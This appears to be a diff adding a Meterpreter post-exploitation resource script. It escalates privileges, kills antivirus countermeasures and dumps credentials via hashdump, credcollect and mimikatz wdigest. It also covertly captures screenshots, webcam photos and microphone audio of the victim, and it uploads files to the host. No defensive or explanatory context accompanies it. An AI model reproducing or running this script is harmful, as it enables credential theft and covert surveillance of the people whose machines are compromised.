@@ -1,0 +1,23 @@
+getsystem
+run getcountermeasure -k
+screenshot -p super_secret_evil_hacker_file.jpg -v false
+run fake_sleep
+upload super_secret_evil_hacker_file.jpg
+run checkvm
+run credcollect
+#upload super_secret_evil_hacker_file.txt
+run enum_logged_on_users -l
+#run enum_shares
+#run enum_vmware
+run hashdump
+#run net_enum
+#upload super_secret_evil_hacker_file.txt
+webcam_snap -p picture_of_a_victim.jpg -v false
+run fake_sleep
+upload picture_of_a_victim.jpg
+record_mic -d 15 -f voice_of_a_victim.wav -p false
+run fake_sleep
+upload voice_of_a_victim.wav
+load mimikatz
+wdigest
+upload super_secret_evil_hacker_file.txt
